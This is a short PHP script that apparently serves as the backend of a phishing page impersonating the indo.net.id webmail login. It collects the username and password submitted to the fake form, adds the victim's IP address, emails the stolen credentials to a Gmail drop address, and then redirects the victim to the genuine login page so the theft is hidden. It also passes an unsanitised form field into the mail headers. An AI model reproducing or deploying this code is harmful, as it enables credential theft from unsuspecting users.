<?

$ip = getenv("REMOTE_ADDR");
$message .= "------------------------------\n";
$message .= "username: ".$_POST['username']."\n";
$message .= "password: ".$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "-------Created By Arakawa -------\n";



$recipient = "fegrapuoltry3@gmail.com";
$subject = " --New Log $ip -- Source:(indo.net.id) ";
$headers = "From: indo.net.id";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: https://newems.indo.net.id/login.php ");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>